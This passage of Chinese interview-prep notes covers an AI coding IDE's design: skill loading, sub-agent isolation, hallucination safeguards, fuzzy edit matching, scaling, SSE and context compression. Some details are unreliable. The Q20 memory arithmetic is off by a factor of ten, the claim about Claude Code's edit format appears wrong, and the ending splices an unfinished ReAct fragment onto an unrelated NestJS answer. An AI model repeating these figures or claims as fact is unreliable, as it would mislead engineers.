而 dev.sh 的主服务是 server-node（5175），不是 Express（5174）。如果用户启动了 dev.sh 但没单独启动 Express server，5174 没人监听，请求直接失败——但前端 `fetch('/api/skills').catch(() => {})` 静默吞了错误，用户看到的就是空列表。

**修复**：`vite.config.ts` 代理改回 `http://localhost:5175`。

#### 第三层：Electron 打包版为什么也不行？

Electron 打包后使用 server-node，默认 workspace 是 `~/MiniCodeIDE`（来自 `config.json`），该目录没有 `.minicodeide/skills/`。

**修复**：把用户级 skill 放到 `~/.minicodeide/skills/`，这样不管 workspace 是什么，SkillStore 都能从用户级目录加载。SkillStore 的扫描逻辑是先加载 `user` 级（`~/.minicodeide/skills/`），再加载 `project` 级（`workspace/.minicodeide/skills/`），同名 project 覆盖 user。

#### 第四层：前端 `/` 面板的渲染逻辑

即使 API 返回了 skill，前端也有截断问题：

```typescript
// 原代码
return [...slashItems, ...skillItems].slice(0, 10);
```

builtin slash 命令有 10 个，skill 1 个，合并后 11 个，`slice(0, 10)` 恰好把所有 skill 截掉了！

**修复**：
- skill 排在 slash 前面（用户安装的 skill 优先于内置命令）
- 上限提升到 20
- `q` 为空时（只输入 `/`）展示全部 skill

#### 第五层：matchForInput 只靠 triggers 匹配，没有兜底

后端 `matchForInput()` 原来有 `if (!meta.triggers.length) continue`——没有 triggers 的 skill 直接跳过，永远无法自动触发。

**修复**：去掉硬跳过，加 name/description 兜底匹配：
- triggers 匹配权重最高（+2/+1）
- name 子串包含（+2）、name token 匹配（+2）
- description 关键词匹配，要求至少 2 个 token 命中才加分（+1），防止误触发

#### 自动刷新机制设计

修复了以上问题后，还有一个体验问题：用户新增一个 skill 文件后，需要刷新页面或切换 workspace 才能在 `/` 面板看到。怎么做到自动刷新？

**方案**：chokidar 文件监听 + SSE 事件广播 + Zustand 版本号驱动

```
SKILL.md 文件变更
  → chokidar (SkillStore.startWatch) 检测 add/change/unlink
    → SkillStore.load() 重新扫描
      → SkillStore.onChange() 回调
        → SSE 广播 { event: 'skills.changed' }
          → App.tsx EventSource 监听 → store.bumpSkills()（skillVersion++）
            → ChatPanel useEffect([skillVersion]) → fetch('/api/skills') → 刷新面板
```

关键设计决策：

1. **为什么用版本号而不是直接在 SSE 中传 skill 列表？** SSE 是轻量通知，不应该传大量数据。skill 列表可能包含长 description，放 SSE 里浪费带宽。版本号方案让前端自行决定是否刷新、何时刷新。

2. **为什么复用 fsEventClients 而不是新建 SSE 端点？** 文件变更事件和 skill 变更事件都走同一个 `/api/fs/events` SSE 连接，减少连接数（浏览器 HTTP/1.1 同 host 最多 6 连接）。前端 App.tsx 已有 EventSource 监听该端点，FileTree 不再独立建连，只需要在 App.tsx 的 onmessage 中加一个 `fs_change` 事件分支调用 `loadTree('.')` 即可。

3. **onChange 回调为什么放在 startWatch 之前赋值？** 虽然 chokidar 初始化是异步的，首次事件触发前 onChange 一定已经赋值了，但逻辑上应该先注册回调再启动监听，避免竞态条件。

**追问："为什么不用 WebSocket？"**

SSE 是单向推送（服务端→客户端），不需要双向通信。Skill 变更通知是一个典型的"服务端事件广播"场景——客户端不需要发送任何信息，只需要接收通知。SSE 比 WebSocket 简单、兼容性好、不需要协议升级握手。而且项目中已经有 `/api/fs/events` 这个 SSE 端点承载文件系统和 skill 变更事件，复用它零额外成本，同时避免了多开一个 EventSource 连接占用浏览器有限的并发连接数。

**追问："chokidar 监听的性能影响？"**

SkillStore.startWatch 只监听 `.minicodeide/skills/` 目录，depth=2，忽略除 SKILL.md 外的文件。通常只有 1-5 个目录，watcher 开销极小（<1MB 内存）。IndexWatcher 也用 chokidar 监听整个 workspace，但它的 depth 更大、过滤逻辑更复杂，性能影响才需要关注。Skills 的 watcher 和 IndexWatcher 是独立的，互不影响。

**追问："如果两个用户同时编辑 SKILL.md 会怎样？"**

当前是单用户桌面应用，不存在并发编辑。如果是多用户 SaaS 版本，需要：1) SkillStore 加文件锁（flock）；2) SSE 广播给所有连接的客户端；3) 冲突解决策略（last-write-wins 或 merge）。

## 七、子 Agent

### Q16: 子 Agent 之间怎么通信？如果两个子 Agent 需要协作怎么办？

**题目意图**：考察多 Agent 编排的理解。

**参考回答**：

当前设计：**完全隔离，父 Agent 编排**。

- 子 Agent 之间没有直接通信通道
- 子 Agent 看不到兄弟的执行状态
- 结果只能通过父 Agent 转发——子 Agent 完成后 emit `announce` 事件，包含执行摘要，父 Agent 在下一轮 turn 看到

这是刻意的设计，基于三个考量：

1. **避免死锁**：如果 A 等 B 的结果、B 等 A 的结果，就会死锁。完全隔离 + 父 Agent 编排 = 无环依赖。

2. **避免信息混乱**：多 Agent 互相影响可能导致级联错误——A 的输出影响了 B 的行为，B 又反向影响 A。隔离后每个子 Agent 的行为可预测。

3. **简化调度逻辑**：父 Agent 只需要管理"谁先做、谁后做"，不需要处理并发同步。

**子 Agent 的结果如何回到父 Agent？**

Push 模式，不是 Poll：
- `dispatch_subagent` 工具立即返回 `{ runId, childSessionId }`，不等待子 Agent 完成
- 子 Agent 完成后，`SubagentManager` emit `announce` 事件
- 父 Agent 的 loop 在下一轮 turn 开始时，在 messages 中看到 `[Subagent Completed] {runId, summary}`
- 不需要轮询——父 Agent 不需要主动 check 子 Agent 状态

**追问："如果子 Agent 需要协作呢？比如'先分析再重构'？"**

当前靠父 Agent 编排：父 Agent 先 dispatch 分析 Agent → 等结果 → 基于分析结果 dispatch 重构 Agent。两步是串行的。

如果需要并行协作，更好的方案是：
1. **共享只读上下文**：子 Agent 可以读取（但不写入）其他子 Agent 的执行摘要
2. **黑板模式**：所有 Agent 读写同一块"黑板"（共享状态空间），但需要并发控制
3. **AutoGen 风格**：Agent 之间直接对话，但需要防止无限循环

### Q17: 子 Agent 并发写文件冲突怎么解决？

**题目意图**：与 Q3 类似，但聚焦在子 Agent 级别。

**参考回答**：

**Git Worktree 隔离**：
- `SubagentManager.buildChildRegistry()` 创建子 Agent 的工具注册表
- 如果启用 worktree 隔离，`childCtx.cwd = wt.path` → 子 Agent 在隔离目录工作
- 完成后 worktree 自动删除（但分支保留，用户可手动 merge）

**但默认不隔离**，原因有三：
1. `git worktree add` 有 1-2s 开销
2. 大部分场景只有一个子 Agent 在写
3. 用户可能不理解为什么要 merge

**子 Agent 的工具注册表做了裁剪**：`buildChildRegistry()` 会剥离危险工具（如 `dispatch_subagent` 防止嵌套，`accept_all_edits` 防止子 Agent 绕过审查），并应用 role profile 限制。

**追问："如果不隔离，两个子 Agent 同时 write_file 同一个文件怎么办？"**

当前没有解决。这和主 Agent 的 parallelSafe 机制不同——子 Agent 是独立的 Agent Loop，有自己的消息列表和工具调用，不共享并行段分割逻辑。如果两个子 Agent 同时写同一文件，后写的会覆盖先写的（文件系统层面的 last-write-wins）。这正是 worktree 隔离的价值——在隔离目录里各自修改，最后 merge 时可以检测冲突。

## 八、幻觉与质量

### Q18: 你怎么防止 LLM 幻觉？比如 AI 说"我已经修好了"但实际没改代码？

**题目意图**：AI 工程核心问题。

**参考回答**：

五层防线，"Defense in Depth"策略——每一层都可能漏过，但多层叠加后漏过概率指数级下降：

**第一层：Prompt 约束**——System Prompt 中的 Completion Audit
- 强制 LLM "把完成当未证明命题，逐项找权威证据"
- 具体指令："NEVER claim done with failing verification. Treat 'done' as an unproven hypothesis and find authoritative evidence for each claim."

**第二层：工具约束**——Proposed Edit 工作流
- `write_file` / `edit_file` 必须经过 `proposeEdit(req)` → 生成 pending edit ID → 等待用户 Accept/Reject
- LLM 不能直接写文件，只能"提议"写。即使 LLM 幻觉了"我已经修好了"，实际代码没有修改（因为用户没 Accept）

**第三层：循环/预算**——检测重复无效行为
- 循环检测（3轮相同签名注入 loop-breaker）：防止 LLM 反复尝试同一个错误方案
- 工具预算（同一工具连续3次失败停止）：防止 LLM 在错误路径上越走越远

**第四层：自检验证**——verify_changes 工具
- LLM 声称修好后，系统自动（或 LLM 主动）调用 `verify_changes` 跑 typecheck/test/lint
- 验证结果回注到对话中，LLM 看到失败就必须承认并修复
- Prompt 硬约束："NEVER claim done with failing verification"

**第五层：人工审查**——Proposed Edit 工作流
- 用户 Accept/Reject 是最终防线
- diff 视图让用户能直观看到 AI 改了什么

**追问："如果 LLM 绕过 verify_changes 直接声称完成呢？"**

这是 Prompt 约束的局限性——LLM 可以选择不调用 verify_changes。更可靠的方案是**自动触发验证**：在 LLM yield `done` 事件后，系统自动调用 typecheck/test，将结果追加到对话中，然后判断是否真的完成。当前项目的 `HookBus.triggerStop()` 可以实现这个——在 stop hook 里强制插入验证步骤，如果验证失败就 `forceContinue` 让 LLM 继续修复。

### Q19: Fuzzy Apply 四级匹配怎么做的？为什么不直接用 diff？

**题目意图**：考察代码编辑的工程难点。

**参考回答**：

LLM 生成的 edit_file oldString 经常与文件实际内容不完全匹配——缩进差异、行尾空白、LLM 的"创造性修改"（如把 `const` 改成 `let`、把 `foo` 改成 `bar`，即使它只是想改别的部分）。如果只用精确匹配，edit_file 的成功率会很低。

四级匹配，从严格到宽松逐级降级：

1. **精确匹配**：`oldString === fileContent.substring(...)` —— 完全一致才替换
2. **忽略首尾空白匹配**：`oldString.trim() === chunk.trim()` —— 容许 oldString 前后多了空格/换行
3. **逐行 trim 后匹配**：oldString 和文件内容都按行 trim 后比较 —— 容许缩进差异（Tab vs Space、2空格 vs 4空格）
4. **相似度匹配**：`findSimilarLines()` 用 Levenshtein 距离找最相似的片段，返回 `didYouMean` 候选给 LLM —— 即使完全匹配不上，也给 LLM 一个线索

**为什么不用 unified diff？**

1. **LLM 生成 diff 格式的可靠性更低**：diff 需要精确的行号（`@@ -10,5 +10,7 @@`），但 LLM 经常算错行号——特别是经过上下文压缩后，LLM 看到的文件内容可能是截断的，行号对不上
2. **diff 对空白/缩进更敏感**：一个 Tab/Space 的差异就导致 diff apply 失败
3. **search-replace 更符合 LLM 的自然语言理解方式**：LLM 更擅长"找到这段代码，替换成这段代码"，而不是"在第10-15行做以下修改"

**追问："Aider 和 Cursor 各是怎么做的？"**

- **Aider**：也用 search-replace 块（SEARCH/REPLACE），和我们的 edit_file 思路一致
- **Cursor**：用更激进的整块替换——直接生成整个文件的新内容，然后 diff 展示给用户。优点是不会匹配失败，缺点是 token 消耗大
- **Claude Code**：用 APL-style diff（类似 Vim 的行级编辑指令），在 search-replace 和 unified diff 之间取了个折中

## 九、系统设计

### Q20: 如果用户量从 1 扩到 10000，你的系统哪里会先崩？

**题目意图**：经典的扩展性追问。

**参考回答**：

**第一个崩的：VectorStore 全内存**

- 10000 用户 × 50 chunk/文件 × 1000 文件 × 1536 维 × 4 字节 = ~300GB 内存
- 每个用户打开项目时都要加载向量索引到内存，10个用户还好，10000 个用户直接 OOM
- 解决：磁盘索引——hnswlib-node 支持内存映射文件、SQLite-vss 做向量搜索、或者 Qdrant/Milvus 分布式向量数据库

**第二个崩的：jsonl 本地存储**

- Session 数据用 jsonl append-only 存储，多进程写同一个文件会互相覆盖（`fs.appendFile` 不是原子操作）
- 解决：PostgreSQL（已实现云端版 `apps/server-cloud`，Express + Prisma + PG）

**第三个崩的：LLM API 并发**

- 10000 用户同时对话 = 10000 并发 LLM 请求，会触发 API 的 rate limit
- 解决：请求队列 + 优先级调度（BullMQ/RabbitMQ）+ 更多 API Key + 模型分级（简单问题用快模型，复杂问题用强模型）

**第四个崩的：索引构建**

- 每个用户首次打开项目都要 `buildIndex`，tree-sitter 解析 + embedding 计算是 CPU 密集型
- 解决：后台异步构建 + 缓存 + 增量更新（只重新索引变化的文件）

**第五个崩的：SSE 连接**

- 10000 个长连接，Node.js 单进程的文件描述符和内存可能不够
- 解决：集群部署 + Redis Pub/Sub 做跨进程消息分发

### Q21: 为什么用 SSE 而不是 WebSocket 做 Chat 推送？

**题目意图**：考察通信协议选型的理解。

**参考回答**：

四个原因：

1. **Chat 是单向推送**：服务端 → 客户端，SSE 足够。WebSocket 的双向能力多余——客户端发消息用普通 HTTP POST，不需要 WebSocket。

2. **HTTP/1.1 友好**：SSE 不需要协议升级握手（WebSocket 需要从 HTTP 升级到 WS 协议），直接在 HTTP 响应上流式输出。这对代理和防火墙更友好。

3. **简单**：浏览器 `fetch + ReadableStream` 就能消费，不需要 WebSocket 库。具体实现：`fetch('/api/chat', { method: 'POST', body: ... })` 返回 ReadableStream，前端逐 chunk 读取。

4. **POST 支持**：我们用 `fetch + ReadableStream` 而不是 `EventSource`，因为 `EventSource` 只能 GET，但 Chat 请求需要 POST body（消息内容、session ID 等）。这是很多教程没讲到的 SSE 陷阱。

**WebSocket 更好的场景**：
- 终端桥（terminal-bridge）：需要双向通信——用户输入 + 服务器输出
- LSP 通信：需要低延迟请求-响应
- 实际选择：Chat 用 SSE，Terminal/LSP 用 WebSocket

## 十、综合深度题

### Q22: 如果你重新设计这个项目，你会做哪些不同的选择？

**题目意图**：考察反思能力和架构演进思维。

**参考回答**：

1. **packages/server-core 抽取**：server 和 server-node 共享代码用相对路径 `../server/src/*.js` 引入是反模式——耦合度高、不好测试、不能独立版本管理。应该抽取为 `@mini/server-core` 独立包。

2. **Skill 自动触发**：已实现 keyword + triggers 匹配，但更理想的是 embedding 召回——用户输入的 embedding 与 skill description 的 embedding 做相似度匹配，不受关键词限制。

3. **MCP Tool Schema 注入**：MCP 工具参数用 `z.record(z.any())` 太粗糙，LLM 不知道参数格式。已实现 `jsonSchemaToZod()` 转换，但 JSON Schema 的嵌套结构（oneOf/anyOf/嵌套 object）转换还不完整。

4. **MemGPT 式记忆架构**：三层记忆（Core/Summary/Archival）比当前的双 Scope + 启发式摘要更好。特别是 Archival 层——被压缩的内容存入可检索的向量库，LLM 可以主动检索，而不是直接丢弃。

5. **端到端测试**：当前只有单元测试，Chat 流程的 E2E 测试很重要——"用户发消息 → 检索召回 → LLM 调用工具 → 工具执行 → SSE 推送 → 前端渲染"整条链路的测试。

6. **Circuit Breaker**：LLM Router 应该有熔断机制——不只是简单的 fallback，而是连续失败后"断路"一段时间，避免向已经故障的 Provider 发送无意义请求。

7. **流式中间件**：在 LLM 输出和前端之间增加中间件层，支持内容过滤（敏感词）、格式化（Markdown 渲染）、幻觉检测（事实性验证）。

### Q23: 你这个项目最难的工程问题是什么？怎么解决的？

**题目意图**：展示技术深度和解决问题的能力。

**参考回答（选上下文压缩）**：

最难的工程问题是**长对话不崩**——Agent 可能执行 25 步，每步的 tool_result 可能几千字符，对话上下文很容易超出模型窗口。

**难点在哪？**

1. **LLM 是无状态的**：每一步都需要把完整 messages 发给 LLM，不像浏览器可以只发增量。所以同一信息会被反复发送。
2. **压缩是有损的**：压缩意味着丢信息，丢错了就"失忆"——LLM 可能重复做已经做过的事，或忘记用户的原始需求。
3. **时机难把握**：太早压缩丢信息，太晚压缩 overflow。overflow 触发 hardCompact 是最坏情况——大量上下文被丢弃，Agent 基本需要重新开始。

**我的解决方案：四级压缩管线**

- **预防性**（L0-L3）：在对话还没 overflow 时就主动压缩
- **分级策略**：从轻量（去重/截断）到重量（LLM摘要），根据上下文使用率选择
- **紧急兜底**（L4 hardCompact）：即使所有预防都失败，也有兜底方案

**关键设计决策**：

1. **压缩时机**：L1-L3 **每轮 LLM 调用前**都跑（不是等到 overflow），因为预防远比救急便宜。L4 只在 overflow 时触发。

2. **工具结果分级保留**：最近的 3 条 tool_result 完整保留，旧的压缩为一行。为什么是3条？因为 LLM 的推理通常依赖最近几步的操作结果，3条是经验上的平衡点。

3. **大结果落盘**：>4KB 的 tool_result 写磁盘 `.minicodeide/tool-cache/`，messages 里只保留索引行（路径+前400字预览）。LLM 需要时可以用 `read_file` 读回。

4. **Head/Tail 保护**：最早的 system 消息和最近的对话永远不压缩。System 消息包含指令和工具 schema，丢了等于 Agent 失忆。

5. **Hard Compact 保留决策链**：不只是统计性的文件路径+工具使用次数，还从 assistant 消息中用正则提取关键决策片段（"I'll / I decided to / 决定 / 接下来"等），最多保留5条。这样即使被压缩，LLM 也能知道之前做了什么决策。

**不足和改进方向**：Hard Compact 的启发式摘要还是会丢推理链细节。更好的方案是用小模型做结构化摘要，输出 {goal, approach, completed_steps, current_state, pending_issues}。另外，被压缩的内容应该存入可检索的向量库（MemGPT 的 Archival 层），而不是直接丢弃。

### Q24: 你觉得 AI 编程工具的未来方向是什么？

**题目意图**：考察行业洞察力。

**参考回答**：

1. **从"工具"到"同事"**：当前 AI 编程工具是"被动响应"的——用户说了才做。未来会是"主动参与"的——主动发现潜在 bug、主动建议重构方向、主动跑回归测试。这需要 Agent 有"监控-判断-行动"的自主循环，不只是 ReAct 循环。

2. **多 Agent 协作**：不是单 Agent 干所有事，而是专业化 Agent 组成团队。前端 Agent 精通 React/CSS、后端 Agent 精通数据库/API、测试 Agent 精通覆盖率/边界条件、Review Agent 精通代码规范/安全。关键挑战是 Agent 间的通信协议和冲突解决。

3. **长期记忆与知识图谱**：不只是记住偏好，而是构建项目的知识图谱——架构、依赖、变更历史、团队决策。这样 Agent 才能理解"为什么这个函数这样写"，而不只是"这个函数做了什么"。

4. **人机协作范式**：不是"人指挥 AI"或"AI 替代人"，而是"人定义意图和约束，AI 执行和验证"。AI 负责写代码和跑测试，人负责架构决策和需求澄清。Proposed Edit 工作流就是这种范式的雏形。

5. **安全与可信**：随着 AI 自主性增强，安全护栏会越来越重要——沙箱隔离、操作审计、结果验证、MCP 安全。当前的安全机制（白名单、approval、checkpoint）是基础，但不够——需要形式化验证 AI 的操作在安全边界内。

## 十一、Function Calling 与 Agent 模式

### Q25: Function Calling 是原生 API 还是 Prompt 模拟？为什么这么选？

**题目意图**：考察对 FC 实现方式和工程权衡的理解。

**参考回答**：

**原生 FC + Provider 适配层**。

Agent Loop 只操作统一类型：`ChatMessage`、`ToolCall`、`ChatChunk`。Provider 适配层归一化协议差异：
- OpenAI：`tools: [{ type: "function", function: { name, description, parameters } }]`，返回 `tool_calls` 数组
- Anthropic：`tools: [{ name, description, input_schema }]`，返回 `tool_use` content block

参数定义用 Zod Schema → `zodToJsonSchema()` 转 JSON Schema → 传 Provider。LLM 返回的 `tool_call.arguments` 经过 `safeJSONParse` + `Zod.safeParse` 双重校验。

**选原生 FC 的三个理由**：

1. **可靠性**：Provider 保证 JSON 格式——OpenAI/Anthropic 的 FC 是模型训练层面支持的，输出格式有保障。Prompt 模拟需要自己解析文本（如 `Action: tool_name\nArgs: {...}`），但 LLM 可能输出格式不对、少括号、多了换行，解析不稳定。

2. **并发**：OpenAI 原生支持一次返回多个 tool_call（LLM 一次推理决定调用多个工具），Prompt 模拟做不到——文本输出是线性的，不能在一段文本里同时表达两个并行调用。

3. **Token 效率**：FC 参数不在 text 中，不与推理文本互相干扰。Prompt 模拟的 Action 文本会占用 output token，和推理文本竞争注意力。

**追问："Tool Description 怎么写才能让 LLM 正确选择工具？"**

Tool Description 是最关键的 Prompt 工程——它决定了 LLM 什么时候调这个工具、传什么参数。好的 Description 应该包含：
1. **何时用**："Use this tool when you need to search for a symbol definition or reference"
2. **怎么用**："Provide the symbol name; use fully qualified name for disambiguation"
3. **什么不用**："Do NOT use this for full-text search; use grep_search instead"
4. **参数说明**：每个参数的 JSON Schema description 字段要写清楚类型和格式

### Q26: ReAct 循环中 Thought 和 Action 是怎么分的？有没有显式标签？

**题目意图**：考察对 Agent 推理模式的理解深度。

**参考回答**：

**隐式 ReAct**，没有显式 `Thought: / Action: / Observation:` 标签。

| ReAct 概念 | 对应 | 实现 |
|-----------|------|------|
| Thought | `textBuf`（assistant 的纯文本部分） | LLM 自由文本输出，在 `loop.ts` L134: `let textBuf = ''` |
| Action | `tool_calls`（原生 FC 返回） | 结构化 JSON，在 `loop.ts` L225-231 组装 |
| Observation | `role: 'tool'` 消息 | 工具执行结果回填到 messages |

代码中的对应关系：
1. LLM 返回的流被拆分为 `delta`（文本）和 `toolCallDelta`（工具调用）
2. 文本累积到 `textBuf`，工具调用累积到 `toolBuffers`
3. 流结束后，`textBuf` 变成 assistant 消息的 `content`，`toolBuffers` 变成 `tool_calls`
4. 工具执行后，结果作为 `role: 'tool'` 消息 push 到 messages
5. 下一轮 LLM 看到 [之前的 Thought + Action + Observation]，继续推理

终止语义：`!toolCalls.length → done`（L269-279）。LLM 不再请求工具 = 循环结束。

**显式思考：`think` 工具**

另外有 `think` 工具作为显式思考步骤——给 LLM 一个 scratchpad，在不触发外部操作时整理思路。这在 ReAct 中相当于不消耗外部资源的"纯思考"步骤，特别适合被 loop-breaker 打断后的重新规划。

**追问："隐式 ReAct 和显式 ReAct（LangChain 风格）哪个好？"**

隐式 FC ReAct 更好，原因：
1. **格式可靠**：FC 是 Provider 训练层面支持的，JSON 输出有保障。显式 ReAct 依赖 LLM 自由文本遵循 `Thought: ... Action: ...` 格式，不稳定。
2. **支持并发**：FC 一次返回多个 tool_call，可以并发执行。显式 ReAct 的文本输出是线性的，一次只能表达一个 Action。
3. **Token 效率**：FC 的 Action 不占 text token。显式 ReAct 的 `Action: tool_name(args)` 占用 output token。

但显式 ReAct 的优势是**兼容性**——对不支持 FC 的小模型（如某些本地模型），可以 fallback 到 Prompt 模拟的 ReAct 格式。

## 十二、上下文工程深度

### Q27: 上下文检索是一次性注入还是渐进式？上下文会不会太大？

**题目意图**：考察上下文工程的系统性理解。

**参考回答**：

**一次性全量注入**。`buildMessages()` 在 LLM 调用前把所有上下文一次性拼到 system 消息中：

- autoContext（最多6条，每条截2000字符）→ `<retrieved-context>` 块
- memory（最多5条，每条截500字符）→ `<memory>` 块，经 InjectionCache 去重
- @-mentions 解析结果 → `<explicit-context>` 块

**分层策略**（已实现）：

system 消息按稳定性分为两层：
- **稳定层**（`stableParts`）：system prompt + rules + skills overview + project memory。打 `cacheHint: 'ephemeral'`，Anthropic 的 Prompt Cache 可以命中
- **动态层**（`dynamicParts`）：autoContext + memory + explicitContext。每轮变化，不缓存

对 Anthropic：两条合并为单条 system 消息（稳定前缀 + 动态后缀），Prefix Cache 只匹配前缀不变的部分。
对其他 Provider：拆成两条 system 消息，稳定部分带 cacheHint。

**典型上下文大小**：
- System Prompt: ~2000 token
- Tools Schema: ~3000 token（agent 模式全量）/ ~600 token（plan 模式 CHAT_ONLY_PROFILE）
- AutoContext: ~3000 token
- Memory: ~600 token
- History（压缩后）: ~10000 token
- 总计约 ~20000 token，是 Claude 200K 窗口的 10%

**风险场景**：
1. 用户大量 @-mention 文件 → explicitContext 膨胀（没有上限限制）
2. 长对话压缩不及时 → history 超预算
3. 工具 Schema 全量发送 → 固定消耗 3000 token（已通过 Progressive Tool Disclosure 优化：plan 模式用 `CHAT_ONLY_PROFILE` 只发5个工具 ~600 token）

**双重检索机制**：预注入 + LLM 主动检索。系统有 `semantic_search`、`grep_search`、`find_symbol` 工具让 LLM 主动检索，所以不需要把所有相关代码都预注入——预注入的是"大概率需要"的上下文，LLM 主动检索的是"按需深入"的内容。

### Q28: 怎么在保证准确性的同时防止幻觉，还让回答满足格式要求？

**题目意图**：考察 AI 工程中最核心的权衡问题。

**参考回答**：

三个目标看似矛盾，实际上对不同环节用不同策略——不要一刀切：

| 环节 | 格式策略 | 幻觉防护 | 准确性保障 |
|------|---------|---------|-----------|
| 工具参数 | 原生 FC + Zod Schema（严格） | Zod 校验拒绝非法参数 | Schema description 帮助 LLM 理解 |
| 代码编辑 | fuzzyApply 四级匹配（宽松+校验） | read_before_write + proposeEdit | verify_changes 自检 |
| 自由回答 | 无格式约束 | Completion Audit 逐项验证 | 证据锚定 `path:line` |

**详细解释**：

1. **工具参数**：格式约束最严格。Zod Schema 定义了参数的类型、范围、必填性，`tool-registry.ts` 的 `execute()` 方法在调用工具前先 `tool.schema.safeParse(rawArgs)` 校验。这保证了 LLM 不能传非法参数——比如 `edit_file` 的 `old_string` 必须是字符串、`max_results` 必须是正整数。格式约束和幻觉防护是一致的：Zod 校验既保证了格式正确，又防止了幻觉性的非法参数。

2. **代码编辑**：格式约束宽松（fuzzyApply 容许缩进差异），但校验严格（proposeEdit + verify_changes）。LLM 生成的 oldString 不需要精确匹配——四级匹配从精确到相似度逐步降级。但最终写文件必须经过用户审批，写完后自动跑 typecheck 验证。

3. **自由回答**：不限制格式，让 LLM 自由推理。但用 Completion Audit 机制要求 LLM 对每个声明提供证据——"你说改了 X 文件，请调用 read_file 验证"。

**核心洞察**：格式约束和防幻觉不矛盾，关键是**对需要结构化的场景用 FC 严格约束，对需要推理自由的场景用自然文本**。强制所有输出都走 JSON Schema 会严重损害 LLM 的推理能力——模型需要"思考空间"，如果每个 token 都要符合 Schema，推理质量会下降。

### Q29: Token 重复浪费怎么处理？格式规范化后又带来重复内容怎么办？

**题目意图**：考察 Token 经济学的理解。

**参考回答**：

Agent ReAct 循环中每一步都需要把完整 messages 发给 LLM（HTTP 无状态），所以同一信息会被反复发送。这不是"浪费"，而是 LLM API 的固有特性——解决方案不是消除重复，而是**减少不必要的重复**和**利用缓存**。

**现有去重/缓存机制**：

1. **InjectionCache**（`injection-cache.ts`）：同 session 不重复注入相同 memory/chunk。key = normalized URI，value = SHA256(content) 前16位。如果内容和上一轮一样（hash 一致），跳过注入。5条不变的 memory 每轮省 ~2500 token。

2. **Immediate Spill / L3 spillLargeToolResults**：tool_result > 4KB 立即落盘到 `.minicodeide/tool-cache/` 或 `.minicodeide/spill/`，messages 里只保留索引行（路径+前400字预览）。后续轮次发送的 messages 中，大结果只有一行占位，而不是几千字符。

3. **Soft Compact L2 microCompact**：旧 tool_result 压成一行 `[Earlier tool result compacted (N chars). Re-run the tool with current context if you need it again.]`。保留最近3条完整。

4. **Prompt Cache**：Anthropic 端 system + tools 缓存命中时免 token。实现方式：稳定层打 `cacheHint: 'ephemeral'`，Anthropic API 会按前缀匹配缓存——如果 system 消息前缀不变（system prompt + rules + skills overview），这部分 token 不计费。

5. **Progressive Tool Disclosure**：plan 模式只给 5 个工具（`CHAT_ONLY_PROFILE`：read_file, list_files, grep_search, find_symbol, search_web），~600 token vs 全量 27+ 工具的 ~3000 token。每轮省 ~2400 token。

**追问："system 消息的稳定层和动态层分离是怎么做的？"**

在 `builder.ts` 中：
- `stableParts` 收集 system prompt + rules + skills overview + project memory
- `dynamicParts` 收集 autoContext + memory + explicitContext

对 Anthropic：合并为单条 system 消息 `[stableContent, ...dynamicContent].join('\n\n')`，打 `cacheHint: 'ephemeral'`。Anthropic 的 Prefix Cache 按前缀匹配——只要 stableContent 不变，缓存命中。

对其他 Provider：拆成两条 system 消息——稳定部分带 `cacheHint: 'ephemeral'`，动态部分不带。

## 十三、异步架构

### Q30: 异步请求怎么追踪？并发请求怎么区分是谁的？是在请求里加任务 ID 让 LLM 带回来吗？

**题目意图**：考察异步系统设计的理解，以及是否会把 LLM 当"传输层"的错误认知。

**参考回答**：

**关键认知：LLM 不需要参与 ID 管理。** 让 LLM 带任务 ID 是一个常见的错误设计——把 LLM 当成了"传输层"。

**三层追踪机制**：

1. **tool_call.id**（LLM 层面）：
   - Provider 自动生成唯一标识（如 OpenAI 的 `call_abc123`）
   - LLM 返回 tool_call 时自带 id，系统回填 tool_result 时用 `tool_call_id` 关联
   - `ChatMessage.tool_call_id` 字段就是用来做这个关联的
   - 这是 FC 协议的标准机制，不需要我们自己设计

2. **Session ID + Turn ID**（会话层面）：
   - 前端传递 session ID，每轮生成 turn ID
   - Session 数据 jsonl 落盘，每条记录带 sessionId + turnId
   - 同一 session 的并发请求互斥（SessionLock）——防止两个请求同时修改 messages 数组

3. **SSE 连接**（传输层面）：
   - HTTP 请求天然关联请求和响应——一个 SSE 连接对应一个 chat 请求
   - 不需要额外的 ID 来区分

**为什么不在请求里加任务 ID 让 LLM 带回来？**

1. **LLM 不保证遵从**：你让它带 `task_id: "xxx"`，它可能忘带、带错、格式不对。LLM 是概率模型，不是确定性的程序。
2. **违反 FC 语义**：原生 FC 的 `tool_call.id` 是 Provider 生成的，不应该被覆盖。如果你自己在参数里加 task_id，和 Provider 的 id 是两套系统，容易混乱。
3. **增加 Prompt 负担**：额外格式要求消耗 LLM 的注意力，影响工具选择准确性——LLM 需要同时关注"调哪个工具"和"带什么 ID"，两个任务的注意力互相竞争。
4. **不需要**：`tool_call.id` 已经完美解决了请求-响应关联问题。tool_result 通过 `tool_call_id` 和对应的 tool_call 关联，这在 FC 协议里是标准机制。

**子 Agent 异步追踪**：
- `dispatch_subagent` 工具立即返回 `{ runId, childSessionId }`，不等待子 Agent 完成
- 子 Agent 完成后 **Push** 注入 `[Subagent Completed]` 消息到父 session
- 父 Agent 下一轮 turn 看到结果，不需要轮询

**追问："子 Agent 的 SSE 事件怎么传到前端？"**

子 Agent 的事件（child_text、child_tool、child_tool_result）通过 `subagentEventBuffer` 统一缓冲，在主 Agent 的 SSE 循环中批量 flush 给前端。child_text 事件有 200ms 节流——按 runId 聚合累积，每 200ms 批量发送一次，避免逐 token 发送造成带宽风暴。前端收到后可以在 UI 中展示子 Agent 的实时状态。

一、三者标准流程拆解
1. ReAct（Reason + Act 思考行动循环）
循环闭环：
Thought → Action(工具调用) → Observation(结果) → 回到Thought
逐轮迭代，每一步工具返回后立刻修正思考，动态调整下一步动作。

如果面试官问"为什么不用 NestJS/Express"，你的回答应该是：

我们是桌面 IDE 内嵌后端，单租户、冷启动 <50ms 是硬需求。NestJS 的 DI + 装饰器 + 模块系统对 50 个端点的本地服务过度设计，启动要 1s+。Express 可以但 2488 行单文件已经失控，而且零依赖的 bare Node 方案更轻量。最终选择 bare Node + 手动 Services 容器 + 手写 Router，跟 CodeFlicker 的设计对齐——启动极快、依赖为零、逻辑透明。
